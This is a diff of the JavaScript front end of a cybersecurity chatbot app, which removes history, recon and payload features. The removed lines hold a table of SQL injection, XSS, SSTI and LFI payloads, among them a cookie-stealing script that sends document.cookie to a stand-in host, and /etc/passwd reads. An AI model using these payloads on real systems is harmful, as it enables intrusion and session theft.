@@ -1,4 +1,4 @@
-// Cy30rt_AI - Complete Version with Conversation Memory & Stop Button
+// Cy30rt_AI - WORKING VERSION
 // Created by Abdulbasid Yakubu (cy30rt)
 
 const API_URL = "https://cy30rt-ai.onrender.com";
@@ -6,74 +6,23 @@ const API_URL = "https://cy30rt-ai.onrender.com";
 // Global variables
 let currentLanguage = "en";
 let audioInitialized = false;
-let chatHistory = [];
-let currentChatId = null;
-let recordingStatusDiv = null;
 let currentAbortController = null;
 let isGenerating = false;
-let currentSessionId = null;
-let localConversationHistory = [];
 
 // Voice settings
 let voiceSpeed = 1.0;
 let voicePitch = 1.0;
 let autoPlayEnabled = false;
-let voiceReadbackEnabled = false;
 
 // Voice map
 const voiceMap = {
-    'en': 'en-US', 'ar': 'ar-SA', 'es': 'es-ES',
-    'fr': 'fr-FR', 'de': 'de-DE', 'hi': 'hi-IN',
-    'ha': 'en-US', 'yo': 'en-US', 'ig': 'en-US',
-    'pt': 'pt-BR', 'ru': 'ru-RU', 'zh': 'zh-CN',
-    'ja': 'ja-JP', 'ko': 'ko-KR', 'tr': 'tr-TR',
-    'fa': 'fa-IR', 'ur': 'ur-PK'
+    'en': 'en-US', 'ha': 'en-US', 'yo': 'en-US', 'ig': 'en-US',
+    'ar': 'ar-SA', 'es': 'es-ES', 'fr': 'fr-FR', 'de': 'de-DE',
+    'pt': 'pt-BR', 'ru': 'ru-RU', 'zh': 'zh-CN', 'ja': 'ja-JP',
+    'ko': 'ko-KR', 'hi': 'hi-IN', 'tr': 'tr-TR'
 };
 
-// ============ CONVERSATION MEMORY ============
-function initSession() {
-    currentSessionId = localStorage.getItem("cy30rt_session_id");
-    if (!currentSessionId) {
-        currentSessionId = 'session_' + Date.now();
-        localStorage.setItem("cy30rt_session_id", currentSessionId);
-    }
-    
-    const saved = localStorage.getItem(`cy30rt_memory_${currentSessionId}`);
-    if (saved) {
-        try {
-            localConversationHistory = JSON.parse(saved);
-        } catch(e) { localConversationHistory = []; }
-    }
-}
-
-function saveLocalHistory() {
-    if (currentSessionId) {
-        localStorage.setItem(`cy30rt_memory_${currentSessionId}`, JSON.stringify(localConversationHistory.slice(-50)));
-    }
-}
-
-function addToLocalHistory(role, content) {
-    localConversationHistory.push({
-        role: role,
-        content: content,
-        timestamp: new Date().toISOString()
-    });
-    saveLocalHistory();
-}
-
-function getConversationContext() {
-    const recent = localConversationHistory.slice(-10);
-    if (recent.length === 0) return "";
-    
-    let context = "Previous conversation:\n";
-    for (const msg of recent) {
-        context += `${msg.role === 'user' ? 'User' : 'Assistant'}: ${msg.content.substring(0, 500)}\n`;
-    }
-    context += "\nBased on the above conversation, respond to the user's latest message. Maintain consistency and refer back to previous topics.\n";
-    return context;
-}
-
-// ============ STOP BUTTON ============
+// ============ STOP FUNCTION ============
 function stopGeneration() {
     if (currentAbortController) {
         currentAbortController.abort();
@@ -89,578 +38,53 @@ function stopGeneration() {
         <div class="message-avatar">⏹️</div>
         <div class="message-content">
             <div class="message-text" style="background: rgba(239,68,68,0.1); text-align: center;">
-                Generation stopped by user.
+                ⏹️ Generation stopped by user.
             </div>
         </div>
     `;
     container.appendChild(stopDiv);
     scrollToBottom();
-    
-    const stopBtn = document.getElementById("stopBtn");
-    if (stopBtn) stopBtn.classList.remove("active");
 }
 
-// ============ CHAT HISTORY ============
-function initChatHistory() {
-    const saved = localStorage.getItem("cy30rt_chats");
-    if (saved) {
-        try {
-            chatHistory = JSON.parse(saved);
-        } catch (e) { chatHistory = []; }
-    }
-
-    if (chatHistory.length === 0) {
-        createNewChat();
-    } else {
-        currentChatId = chatHistory[0].id;
-        loadCurrentChat();
-    }
-    renderHistoryList();
-}
-
-function saveChats() {
-    localStorage.setItem("cy30rt_chats", JSON.stringify(chatHistory));
-}
-
-function createNewChat() {
-    const newId = Date.now().toString();
-    const newChat = {
-        id: newId,
-        title: "New Chat",
-        messages: [],
-        createdAt: new Date().toISOString(),
-        updatedAt: new Date().toISOString()
-    };
-    chatHistory.unshift(newChat);
-    currentChatId = newId;
-    saveChats();
-    renderHistoryList();
-    loadCurrentChat();
-}
-
-function switchChat(chatId) {
-    currentChatId = chatId;
-    loadCurrentChat();
-    renderHistoryList();
-}
-
-function loadCurrentChat() {
-    const chat = chatHistory.find(c => c.id === currentChatId);
+// ============ MESSAGE FUNCTIONS ============
+function addUserMessage(text) {
     const container = document.getElementById("messagesContainer");
-
-    if (!chat || chat.messages.length === 0) {
-        container.innerHTML = getWelcomeHTML();
-        return;
-    }
-
-    container.innerHTML = '';
-    chat.messages.forEach(msg => {
-        if (msg.role === 'user') {
-            addMessageToUI('user', msg.content, msg.timestamp);
-        } else if (msg.role === 'assistant') {
-            addMessageToUI('assistant', msg.content, msg.timestamp);
-        }
-    });
-    scrollToBottom();
-}
-
-function renderHistoryList() {
-    const historyList = document.getElementById("historyList");
-    if (!historyList) return;
-
-    if (chatHistory.length === 0) {
-        historyList.innerHTML = '<div style="padding: 12px; text-align: center; color: #666;">No chats yet</div>';
-        return;
-    }
-
-    historyList.innerHTML = chatHistory.map(chat => `
-        <div class="history-item ${currentChatId === chat.id ? 'active' : ''}" onclick="switchChat('${chat.id}')">
-            ${escapeHtml(chat.title.substring(0, 30))}
-        </div>
-    `).join('');
-}
-
-function addMessageToCurrentChat(role, content) {
-    const chat = chatHistory.find(c => c.id === currentChatId);
-    if (!chat) return;
-
-    chat.messages.push({
-        role: role,
-        content: content,
-        timestamp: new Date().toISOString()
-    });
-    chat.updatedAt = new Date().toISOString();
-
-    if (role === 'user' && chat.messages.length === 1) {
-        chat.title = content.substring(0, 30) + (content.length > 30 ? '...' : '');
-    }
-
-    saveChats();
-    renderHistoryList();
-}
-
-function getWelcomeHTML() {
-    return `
-        <div class="welcome-screen">
-            <div class="welcome-icon">🤖</div>
-            <h1>Cy30rt_AI</h1>
-            <p>Your cybersecurity & bug bounty assistant</p>
-            <div class="example-prompts">
-                <button class="example-btn" onclick="sendExample('/recon scanme.nmap.org')">Fast Recon</button>
-                <button class="example-btn" onclick="sendExample('/fullrecon scanme.nmap.org')">Full Recon</button>
-                <button class="example-btn" onclick="sendExample('/payload sqli')">Get Payloads</button>
-                <button class="example-btn" onclick="sendExample('/cve CVE-2024-6387')">Look up CVE</button>
-            </div>
-            <div class="creator-note">
-                Created by Abdulbasid Yakubu (cy30rt) | Type /help for commands | 🇳🇬 N-ATLAS for Hausa/Yoruba/Igbo
-            </div>
-        </div>
-    `;
-}
-
-function addMessageToUI(role, content, timestamp = null) {
-    const container = document.getElementById("messagesContainer");
-    const timeStr = timestamp ? new Date(timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();
     const messageDiv = document.createElement("div");
-    messageDiv.className = `message ${role}`;
+    messageDiv.className = "message user";
     messageDiv.innerHTML = `
-        <div class="message-avatar">${role === 'user' ? 'U' : 'AI'}</div>
+        <div class="message-avatar">U</div>
         <div class="message-content">
             <div class="message-header">
-                <span class="message-sender">${role === 'user' ? 'You' : 'Cy30rt_AI'}</span>
-                <span class="message-time">${timeStr}</span>
+                <span class="message-sender">You</span>
+                <span class="message-time">${new Date().toLocaleTimeString()}</span>
             </div>
-            <div class="message-text">${formatMessage(escapeHtml(content))}</div>
+            <div class="message-text">${escapeHtml(text)}</div>
         </div>
     `;
     container.appendChild(messageDiv);
     scrollToBottom();
 }
 
-function addSystemMessage(text) {
+function addAIMessage(text) {
     const container = document.getElementById("messagesContainer");
-    const sysDiv = document.createElement("div");
-    sysDiv.className = "message system";
-    sysDiv.innerHTML = `
-        <div class="message-avatar">ℹ️</div>
-        <div class="message-content">
-            <div class="message-text" style="background: rgba(59,130,246,0.1); text-align: center; font-size: 0.85rem;">
-                ${escapeHtml(text)}
-            </div>
-        </div>
-    `;
-    container.appendChild(sysDiv);
-    scrollToBottom();
-}
-
-function formatMessage(text) {
-    text = text.replace(/```(\w*)\n([\s\S]*?)```/g, '<pre><code>$2</code></pre>');
-    text = text.replace(/`([^`]+)`/g, '<code>$1</code>');
-    text = text.replace(/\n/g, '<br>');
-    return text;
-}
-
-// ============ TYPING ANIMATION ============
-async function typeMessage(element, text) {
-    element.innerHTML = '';
-    const chars = text.split('');
-    for (let i = 0; i < chars.length; i++) {
-        if (!isGenerating) {
-            element.innerHTML += chars.slice(i).join('');
-            break;
-        }
-        element.innerHTML += chars[i];
-        await sleep(10);
-        scrollToBottom();
-    }
-}
-
-function sleep(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-// ============ API CALL WITH CANCEL SUPPORT ============
-async function apiCall(endpoint, options) {
-    if (currentAbortController) {
-        currentAbortController.abort();
-    }
-    
-    currentAbortController = new AbortController();
-    isGenerating = true;
-    
-    const stopBtn = document.getElementById("stopBtn");
-    if (stopBtn) stopBtn.classList.add("active");
-    
-    try {
-        const response = await fetch(`${API_URL}${endpoint}`, {
-            ...options,
-            signal: currentAbortController.signal
-        });
-        isGenerating = false;
-        currentAbortController = null;
-        if (stopBtn) stopBtn.classList.remove("active");
-        return response;
-    } catch (error) {
-        isGenerating = false;
-        currentAbortController = null;
-        if (stopBtn) stopBtn.classList.remove("active");
-        if (error.name === 'AbortError') {
-            throw new Error('CANCELLED');
-        }
-        throw error;
-    }
-}
-
-// ============ RECONIX INTEGRATION ============
-async function runReconix(target, options = {}) {
-    const container = document.getElementById("messagesContainer");
-    const statusDiv = document.createElement("div");
-    statusDiv.className = "message assistant";
-    const messageId = 'recon_' + Date.now();
-    statusDiv.id = messageId;
-    statusDiv.innerHTML = `
-        <div class="message-avatar">🔍</div>
+    const messageDiv = document.createElement("div");
+    messageDiv.className = "message assistant";
+    messageDiv.innerHTML = `
+        <div class="message-avatar">AI</div>
         <div class="message-content">
             <div class="message-header">
-                <span class="message-sender">Recon Engine</span>
+                <span class="message-sender">Cy30rt_AI</span>
                 <span class="message-time">${new Date().toLocaleTimeString()}</span>
             </div>
-            <div class="message-text" id="reconStatus_${messageId}">
-                🚀 Starting reconnaissance on ${target}...
-            </div>
+            <div class="message-text">${formatMessage(escapeHtml(text))}</div>
         </div>
     `;
-    container.appendChild(statusDiv);
+    container.appendChild(messageDiv);
     scrollToBottom();
-
-    try {
-        const response = await apiCall('/api/recon', {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ target: target, options: options })
-        });
-
-        const data = await response.json();
-        const statusText = document.getElementById(`reconStatus_${messageId}`);
-
-        if (data.success) {
-            let resultText = `✅ **Recon Complete - ${target}**\n\n`;
-            resultText += `📊 **Summary:**\n`;
-            resultText += `• Subdomains found: ${data.summary.subdomains_found}\n`;
-            resultText += `• Technologies detected: ${data.summary.technologies_found}\n`;
-            resultText += `• Endpoints discovered: ${data.summary.endpoints_found}\n`;
-            resultText += `• Secrets found: ${data.summary.secrets_found}\n`;
-            resultText += `• Vulnerabilities: ${data.summary.vulnerabilities_found}\n\n`;
-
-            if (data.findings.subdomains.length > 0) {
-                resultText += `🔹 **Subdomains:**\n`;
-                data.findings.subdomains.slice(0, 10).forEach(s => resultText += `  • ${s}\n`);
-                resultText += `\n`;
-            }
-
-            if (data.findings.technologies.length > 0) {
-                resultText += `🔹 **Technologies:**\n`;
-                data.findings.technologies.slice(0, 10).forEach(t => resultText += `  • ${t}\n`);
-                resultText += `\n`;
-            }
-
-            if (data.findings.endpoints.length > 0) {
-                resultText += `🔹 **Key Endpoints:**\n`;
-                data.findings.endpoints.slice(0, 10).forEach(e => resultText += `  • ${e}\n`);
-                resultText += `\n`;
-            }
-
-            if (data.findings.secrets.length > 0) {
-                resultText += `⚠️ **Potential Secrets Found - Review Carefully!**\n`;
-                data.findings.secrets.slice(0, 5).forEach(s => resultText += `  • ${s}\n`);
-                resultText += `\n`;
-            }
-
-            resultText += `💡 **Next Steps:**\n`;
-            resultText += `• Ask me: "Analyze these findings"\n`;
-            resultText += `• Run: /payload sqli for SQL injection payloads\n`;
-            resultText += `• Check subdomains with /recon [subdomain]\n\n`;
-            resultText += `⚠️ Only test on authorized targets!\n\nStay secure. - Cy30rt_AI`;
-
-            if (statusText) {
-                statusText.innerHTML = formatMessage(escapeHtml(resultText));
-            }
-            addToLocalHistory('assistant', resultText);
-            return data.output;
-        } else {
-            if (statusText) {
-                statusText.innerHTML = `❌ **Error:** ${escapeHtml(data.error)}\n\nMake sure Reconix is installed on the server.`;
-            }
-            return null;
-        }
-    } catch (error) {
-        if (error.message !== 'CANCELLED') {
-            const statusText = document.getElementById(`reconStatus_${messageId}`);
-            if (statusText) {
-                statusText.innerHTML = `❌ **Error:** ${escapeHtml(error.message)}`;
-            }
-        }
-        return null;
-    }
-}
-
-// ============ SEND MESSAGE ============
-async function sendMessage() {
-    const input = document.getElementById("messageInput");
-    let message = input.value.trim();
-    if (!message) return;
-
-    input.value = "";
-    input.style.height = "auto";
-
-    const container = document.getElementById("messagesContainer");
-    if (container.querySelector(".welcome-screen")) {
-        container.innerHTML = '';
-    }
-
-    addMessageToUI('user', message);
-    addMessageToCurrentChat('user', message);
-    addToLocalHistory('user', message);
-
-    // Check for cancellation commands first
-    const cancelCommands = ["/cancel", "/stop", "/terminate", "/kill"];
-    if (cancelCommands.includes(message.toLowerCase())) {
-        stopGeneration();
-        return;
-    }
-
-    showTypingIndicator();
-
-    try {
-        // Check for recon commands
-        let isReconCommand = false;
-        let target = null;
-        let options = {};
-
-        if (message.startsWith('/fullrecon')) {
-            target = message.replace('/fullrecon', '').trim();
-            if (target) {
-                isReconCommand = true;
-                addSystemMessage(`🔍 Starting FULL reconnaissance on ${target}...\nType /cancel to stop.`);
-                await runReconix(target, { deep: true, js: true, historical: true, aggressive: true });
-                currentOperationType = null;
-                return;
-            }
-        }
-
-        if (message.startsWith('/recon')) {
-            target = message.replace('/recon', '').trim();
-            if (target) {
-                isReconCommand = true;
-                addSystemMessage(`🔍 Starting reconnaissance on ${target}...\nType /cancel to stop.`);
-                await runReconix(target, { deep: true, threads: 10 });
-                return;
-            }
-        }
-
-        // Handle payload commands
-        if (message.startsWith('/payload')) {
-            const type = message.replace('/payload', '').trim().toLowerCase();
-            const payloads = {
-                'sqli': `💉 **SQL Injection Payloads**\n\n**Authentication Bypass:**\n' OR '1'='1' --\nadmin' --\n' OR 1=1--\n\n**Union-Based:**\n' UNION SELECT null, username, password FROM users--\n' UNION SELECT 1,2,3,4,5--\n\n**Time-Based:**\n' AND SLEEP(5)--\n' OR IF(1=1, SLEEP(5), 0)--`,
-                'xss': `🔓 **XSS Payloads**\n\n**Basic Alert:**\n<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n<svg/onload=alert(1)>\n\n**Cookie Stealing:**\n<script>fetch('https://your-server.com/steal?c='+document.cookie)</script>`,
-                'ssti': `🧠 **SSTI Payloads**\n\n**Jinja2 (Python):**\n{{7*7}}\n{{config}}\n{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`,
-                'lfi': `📂 **LFI/RFI Payloads**\n\n**Basic LFI:**\n../../../../etc/passwd\n../../../etc/passwd%00\nphp://filter/convert.base64-encode/resource=index.php`
-            };
-            if (type && payloads[type]) {
-                hideTypingIndicator();
-                const messageDiv = document.createElement("div");
-                messageDiv.className = "message assistant";
-                messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
-                container.appendChild(messageDiv);
-                const textDiv = messageDiv.querySelector(".message-text");
-                await typeMessage(textDiv, payloads[type]);
-                addMessageToCurrentChat('assistant', payloads[type]);
-                addToLocalHistory('assistant', payloads[type]);
-                if (autoPlayEnabled) textToSpeech(payloads[type], currentLanguage);
-                addAudioControls(messageDiv, payloads[type], currentLanguage);
-                return;
-            }
-        }
-
-        // Handle CVE command
-        if (message.startsWith('/cve')) {
-            const cveId = message.replace('/cve', '').trim().toUpperCase();
-            if (cveId) {
-                const finalCve = cveId.startsWith('CVE-') ? cveId : `CVE-${cveId}`;
-                addSystemMessage(`🔍 Looking up ${finalCve}...`);
-                const response = await apiCall(`/api/cve/${finalCve}`, { method: "GET" });
-                const data = await response.json();
-                hideTypingIndicator();
-                const resultText = formatCVEResult(data, finalCve);
-                const messageDiv = document.createElement("div");
-                messageDiv.className = "message assistant";
-                messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
-                container.appendChild(messageDiv);
-                const textDiv = messageDiv.querySelector(".message-text");
-                await typeMessage(textDiv, resultText);
-                addMessageToCurrentChat('assistant', resultText);
-                addToLocalHistory('assistant', resultText);
-                if (autoPlayEnabled) textToSpeech(resultText, currentLanguage);
-                addAudioControls(messageDiv, resultText, currentLanguage);
-                return;
-            }
-        }
-
-        // Handle help command
-        if (message === '/help' || message === '/commands') {
-            const helpText = getHelpText();
-            hideTypingIndicator();
-            const messageDiv = document.createElement("div");
-            messageDiv.className = "message assistant";
-            messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
-            container.appendChild(messageDiv);
-            const textDiv = messageDiv.querySelector(".message-text");
-            await typeMessage(textDiv, helpText);
-            addMessageToCurrentChat('assistant', helpText);
-            addToLocalHistory('assistant', helpText);
-            if (autoPlayEnabled) textToSpeech(helpText, currentLanguage);
-            addAudioControls(messageDiv, helpText, currentLanguage);
-            return;
-        }
-
-        // Handle who command
-        if (message === '/who' || message === '/creator' || message === '/about') {
-            const whoText = getWhoText();
-            hideTypingIndicator();
-            const messageDiv = document.createElement("div");
-            messageDiv.className = "message assistant";
-            messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
-            container.appendChild(messageDiv);
-            const textDiv = messageDiv.querySelector(".message-text");
-            await typeMessage(textDiv, whoText);
-            addMessageToCurrentChat('assistant', whoText);
-            addToLocalHistory('assistant', whoText);
-            if (autoPlayEnabled) textToSpeech(whoText, currentLanguage);
-            addAudioControls(messageDiv, whoText, currentLanguage);
-            return;
-        }
-
-        // Handle learn command
-        if (message.startsWith('/learn')) {
-            const topic = message.replace('/learn', '').trim().toLowerCase();
-            const lessons = {
-                'sqli': `📚 **SQL Injection Lesson**\n\n**What is SQL Injection?**\nSQL injection occurs when user input is inserted directly into SQL queries without sanitization.`,
-                'xss': `📚 **XSS Lesson**\n\n**What is XSS?**\nInjecting malicious JavaScript into web pages.`
-            };
-            if (topic && lessons[topic]) {
-                hideTypingIndicator();
-                const messageDiv = document.createElement("div");
-                messageDiv.className = "message assistant";
-                messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
-                container.appendChild(messageDiv);
-                const textDiv = messageDiv.querySelector(".message-text");
-                await typeMessage(textDiv, lessons[topic]);
-                addMessageToCurrentChat('assistant', lessons[topic]);
-                addToLocalHistory('assistant', lessons[topic]);
-                if (autoPlayEnabled) textToSpeech(lessons[topic], currentLanguage);
-                addAudioControls(messageDiv, lessons[topic], currentLanguage);
-                return;
-            }
-        }
-
-        // Handle new chat command
-        if (message === '/new' || message === '/clear') {
-            createNewChat();
-            hideTypingIndicator();
-            addSystemMessage("✨ New conversation started! Previous chat saved in sidebar.");
-            return;
-        }
-
-        // Default: Use Groq API with context
-        const context = getConversationContext();
-        
-        const response = await apiCall('/api/chat', {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ 
-                message: message, 
-                language: currentLanguage,
-                session_id: currentSessionId,
-                context: context
-            })
-        });
-
-        if (!response.ok) throw new Error(`HTTP ${response.status}`);
-
-        const data = await response.text();
-        hideTypingIndicator();
-
-        const messageDiv = document.createElement("div");
-        messageDiv.className = "message assistant";
-        messageDiv.innerHTML = `
-            <div class="message-avatar">AI</div>
-            <div class="message-content">
-                <div class="message-header">
-                    <span class="message-sender">Cy30rt_AI</span>
-                    <span class="message-time">${new Date().toLocaleTimeString()}</span>
-                </div>
-                <div class="message-text" id="streamingText"></div>
-            </div>
-        `;
-        container.appendChild(messageDiv);
-
-        const textDiv = messageDiv.querySelector(".message-text");
-        await typeMessage(textDiv, data);
-
-        addMessageToCurrentChat('assistant', data);
-        addToLocalHistory('assistant', data);
-
-        if (autoPlayEnabled) {
-            textToSpeech(data, currentLanguage);
-        }
-
-        addAudioControls(messageDiv, data, currentLanguage);
-
-    } catch (error) {
-        hideTypingIndicator();
-        if (error.message !== 'CANCELLED') {
-            console.error(error);
-            addErrorMessage(error.message);
-        }
-    }
-}
-
-function formatReconResults(data) {
-    let results = `✅ **Recon Complete - ${data.target}**\n\n`;
-    results += `📊 **Summary**\n`;
-    results += `• Subdomains found: ${data.summary?.subdomains_found || 0}\n`;
-    results += `• Technologies detected: ${data.summary?.technologies_found || 0}\n`;
-    results += `• Endpoints discovered: ${data.summary?.endpoints_found || 0}\n`;
-    results += `• Secrets found: ${data.summary?.secrets_found || 0}\n\n`;
     
-    if (data.findings?.subdomains?.length > 0) {
-        results += `🔹 **Subdomains Found:**\n`;
-        data.findings.subdomains.slice(0, 15).forEach(s => results += `  • ${s}\n`);
-        results += `\n`;
+    if (autoPlayEnabled) {
+        textToSpeech(text, currentLanguage);
     }
-    
-    return results;
-}
-
-function formatCVEResult(data, cveId) {
-    if (!data || data.error) {
-        return `🔍 **${cveId}**\n\n❌ CVE not found or error occurred.\n\nCheck the ID format (e.g., CVE-2024-6387)`;
-    }
-    return `🔍 **${cveId}**\n\n**Summary:** ${data.summary || 'No summary available'}\n\n**CVSS Score:** ${data.cvss || 'N/A'}\n\n**Published:** ${data.published || 'N/A'}`;
-}
-
-function getHelpText() {
-    return `🤖 **Cy30rt_AI Commands**\n\n🔍 **RECONNAISSANCE:**\n/recon <target> - Fast recon\n/fullrecon <target> - Complete workflow\n\n💉 **PAYLOADS:**\n/payload sqli - SQL injection\n/payload xss - XSS\n/payload ssti - SSTI\n/payload lfi - LFI/RFI\n/payload csrf - CSRF\n\n📋 **INTELLIGENCE:**\n/cve <id> - Look up CVE\n\n📚 **LEARNING:**\n/learn sqli - SQL lesson\n/learn xss - XSS lesson\n\n🛑 **CONTROL:**\n/cancel - Stop current operation\n/stop - Same as cancel\n/new - Start new chat\n\n💬 **GENERAL:**\n/help - Show this\n/who - About creator\n\n🌍 **N-ATLAS:** Supports Hausa (🇳🇬), Yoruba (🇳🇬), Igbo (🇳🇬)`;
-}
-
-function getWhoText() {
-    return `🤖 **Cy30rt_AI**\n\nCreated by **Abdulbasid Yakubu (cy30rt)** - Cybersecurity Professional\n\n**Features:**\n• Real reconnaissance tools (Reconix, Amass, Nuclei, etc.)\n• Payload generation (SQLi, XSS, SSTI, LFI, CSRF)\n• CVE lookup\n• Voice input with adjustable speed/pitch\n• 15+ languages support including 🇳🇬 Hausa/Yoruba/Igbo via N-ATLAS\n• Chat history\n• Conversation memory - I remember our chat!\n• /cancel to stop any operation\n\n⚠️ Always test on authorized targets only!`;
-}
-
-function sendExample(prompt) {
-    document.getElementById("messageInput").value = prompt;
-    sendMessage();
 }
 
 function addErrorMessage(error) {
@@ -668,7 +92,7 @@ function addErrorMessage(error) {
     const errorDiv = document.createElement("div");
     errorDiv.className = "message assistant";
     errorDiv.innerHTML = `
-        <div class="message-avatar">!</div>
+        <div class="message-avatar">⚠️</div>
         <div class="message-content">
             <div class="message-header">
                 <span class="message-sender">Error</span>
@@ -681,46 +105,108 @@ function addErrorMessage(error) {
     scrollToBottom();
 }
 
-function addAudioControls(messageDiv, text, language) {
-    const existing = messageDiv.querySelector(".audio-controls");
-    if (existing) existing.remove();
+function formatMessage(text) {
+    text = text.replace(/```(\w*)\n([\s\S]*?)```/g, '<pre><code>$2</code></pre>');
+    text = text.replace(/`([^`]+)`/g, '<code>$1</code>');
+    text = text.replace(/\n/g, '<br>');
+    return text;
+}
 
-    const controlsDiv = document.createElement("div");
-    controlsDiv.className = "audio-controls";
+function escapeHtml(text) {
+    const div = document.createElement("div");
+    div.textContent = text;
+    return div.innerHTML;
+}
 
-    const playBtn = document.createElement("button");
-    playBtn.className = "audio-btn";
-    playBtn.textContent = "Play Audio";
+function scrollToBottom() {
+    const chatArea = document.getElementById("chatArea");
+    if (chatArea) chatArea.scrollTop = chatArea.scrollHeight;
+}
 
-    const stopBtn = document.createElement("button");
-    stopBtn.className = "audio-btn";
-    stopBtn.textContent = "Stop";
+function showTypingIndicator() {
+    const indicator = document.getElementById("typingIndicator");
+    if (indicator) indicator.style.display = "flex";
+    scrollToBottom();
+}
 
-    let isPlaying = false;
+function hideTypingIndicator() {
+    const indicator = document.getElementById("typingIndicator");
+    if (indicator) indicator.style.display = "none";
+}
 
-    playBtn.onclick = async() => {
-        if (isPlaying) {
-            window.speechSynthesis.cancel();
-            playBtn.textContent = "Play Audio";
-            isPlaying = false;
-            return;
+// ============ SEND MESSAGE ============
+async function sendMessage() {
+    const input = document.getElementById("messageInput");
+    const message = input.value.trim();
+    if (!message) return;
+    
+    input.value = "";
+    input.style.height = "auto";
+    
+    // Remove welcome screen if present
+    const container = document.getElementById("messagesContainer");
+    if (container.querySelector(".welcome-screen")) {
+        container.innerHTML = '';
+    }
+    
+    addUserMessage(message);
+    showTypingIndicator();
+    
+    try {
+        // Create AbortController for stop functionality
+        if (currentAbortController) {
+            currentAbortController.abort();
         }
-        playBtn.textContent = "Playing...";
-        isPlaying = true;
-        await textToSpeech(text, language);
-        playBtn.textContent = "Play Audio";
-        isPlaying = false;
-    };
+        currentAbortController = new AbortController();
+        isGenerating = true;
+        
+        const response = await fetch(`${API_URL}/api/chat`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ message: message, language: currentLanguage }),
+            signal: currentAbortController.signal
+        });
+        
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        
+        const data = await response.text();
+        hideTypingIndicator();
+        addAIMessage(data);
+        isGenerating = false;
+        currentAbortController = null;
+        
+    } catch (error) {
+        hideTypingIndicator();
+        if (error.name === 'AbortError') {
+            addSystemMessage("⏹️ Generation stopped.");
+        } else {
+            console.error(error);
+            addErrorMessage(error.message);
+        }
+        isGenerating = false;
+        currentAbortController = null;
+    }
+}
 
-    stopBtn.onclick = () => {
-        window.speechSynthesis.cancel();
-        playBtn.textContent = "Play Audio";
-        isPlaying = false;
-    };
+function addSystemMessage(text) {
+    const container = document.getElementById("messagesContainer");
+    const sysDiv = document.createElement("div");
+    sysDiv.className = "message system";
+    sysDiv.innerHTML = `
+        <div class="message-avatar">ℹ️</div>
+        <div class="message-content">
+            <div class="message-text" style="background: rgba(59,130,246,0.1); text-align: center;">
+                ${escapeHtml(text)}
+            </div>
+        </div>
+    `;
+    container.appendChild(sysDiv);
+    scrollToBottom();
+}
 
-    controlsDiv.appendChild(playBtn);
-    controlsDiv.appendChild(stopBtn);
-    messageDiv.querySelector(".message-content").appendChild(controlsDiv);
+function sendExample(prompt) {
+    document.getElementById("messageInput").value = prompt;
+    sendMessage();
 }
 
 // ============ AUDIO FUNCTIONS ============
@@ -731,7 +217,7 @@ function initAudio() {
         silent.volume = 0;
         window.speechSynthesis.speak(silent);
         audioInitialized = true;
-    } catch (e) {}
+    } catch(e) {}
 }
 
 async function textToSpeech(text, languageCode) {
@@ -754,89 +240,45 @@ async function textToSpeech(text, languageCode) {
 function setupVoiceInput() {
     const voiceBtn = document.getElementById("voiceBtn");
     if (!voiceBtn) return;
-
+    
     const SpeechRecognition = window.webkitSpeechRecognition || window.SpeechRecognition;
     if (!SpeechRecognition) { voiceBtn.style.opacity = "0.5"; return; }
-
+    
     const recognition = new SpeechRecognition();
     recognition.continuous = false;
     recognition.interimResults = false;
-
+    
     voiceBtn.onclick = () => {
         initAudio();
         recognition.lang = currentLanguage === "ar" ? "ar-SA" : "en-US";
         recognition.start();
         voiceBtn.classList.add("recording");
-        showRecordingStatus();
     };
-
+    
     recognition.onresult = (event) => {
         const text = event.results[0][0].transcript;
         document.getElementById("messageInput").value = text;
         sendMessage();
         voiceBtn.classList.remove("recording");
-        hideRecordingStatus();
     };
-
-    recognition.onerror = () => { voiceBtn.classList.remove("recording");
-        hideRecordingStatus(); };
-    recognition.onend = () => { voiceBtn.classList.remove("recording");
-        hideRecordingStatus(); };
-}
-
-function showRecordingStatus() {
-    if (recordingStatusDiv) recordingStatusDiv.remove();
-    recordingStatusDiv = document.createElement("div");
-    recordingStatusDiv.className = "recording-status";
-    recordingStatusDiv.innerHTML = 'Recording... Speak now';
-    document.body.appendChild(recordingStatusDiv);
-    setTimeout(() => { if (recordingStatusDiv) recordingStatusDiv.remove(); }, 10000);
-}
-
-function hideRecordingStatus() {
-    if (recordingStatusDiv) { recordingStatusDiv.remove();
-        recordingStatusDiv = null; }
-}
-
-// ============ HELPER FUNCTIONS ============
-function showTypingIndicator() {
-    const indicator = document.getElementById("typingIndicator");
-    if (indicator) indicator.style.display = "flex";
-    scrollToBottom();
-}
-
-function hideTypingIndicator() {
-    const indicator = document.getElementById("typingIndicator");
-    if (indicator) indicator.style.display = "none";
-}
-
-function scrollToBottom() {
-    const chatArea = document.getElementById("chatArea");
-    if (chatArea) chatArea.scrollTop = chatArea.scrollHeight;
-}
-
-function escapeHtml(text) {
-    const div = document.createElement("div");
-    div.textContent = text;
